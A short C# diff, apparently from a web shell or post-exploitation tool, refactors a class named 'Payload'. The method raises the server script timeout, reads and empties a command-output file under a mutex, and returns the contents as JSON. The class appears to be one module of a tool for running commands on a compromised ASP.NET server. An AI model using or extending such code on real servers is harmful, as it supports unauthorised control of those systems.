@@ -19,13 +19,13 @@ public class Payload
         public string msg = "";
     }
     Ret ret;
-    public string Run()
+    public static string run()
     {
         HttpContext.Current.Server.ScriptTimeout = 3600;
         ret = new Ret();
-        Directory.SetCurrentDirectory(Global.pwd);
+        Directory.SetCurrentDirectory(Globals.pwd);
         Mutex mut = new Mutex(false, "test123");
-        if (File.Exists(Global.outfile))
+        if (File.Exists(Globals.outfile))
         {
             while (true)
             {
@@ -33,8 +33,8 @@ public class Payload
                 try
                 {
                     mut.WaitOne();
-                    data = File.ReadAllBytes(Global.outfile);
-                    File.WriteAllText(Global.outfile, "");
+                    data = File.ReadAllBytes(Globals.outfile);
+                    File.WriteAllText(Globals.outfile, "");
                 }
                 catch (FileNotFoundException)
                 {
@@ -56,6 +56,6 @@ public class Payload
         {
             ret.code = -1;
         }
-        return Global.json_encode(ret);
+        return Globals.json_encode(ret);
     }
 }
